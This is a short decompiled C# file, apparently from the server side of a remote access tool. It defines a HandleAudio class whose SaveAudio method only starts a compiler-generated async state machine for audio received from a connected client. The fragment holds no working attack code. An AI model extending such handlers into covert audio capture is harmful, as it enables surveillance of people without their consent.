using System;
using System.Runtime.CompilerServices;
using Server.Connection;
using Server.MessagePack;

namespace Server.Handle_Packet
{
	// Token: 0x0200006C RID: 108
	public class HandleAudio
	{
		// Token: 0x060003FE RID: 1022 RVA: 0x00025524 File Offset: 0x00023724
		public void SaveAudio(Clients client, MsgPack unpack_msgpack)
		{
			HandleAudio.<SaveAudio>d__0 <SaveAudio>d__;
			<SaveAudio>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<SaveAudio>d__.client = client;
			<SaveAudio>d__.unpack_msgpack = unpack_msgpack;
			<SaveAudio>d__.<>1__state = -1;
			<SaveAudio>d__.<>t__builder.Start<HandleAudio.<SaveAudio>d__0>(ref <SaveAudio>d__);
		}
	}
}
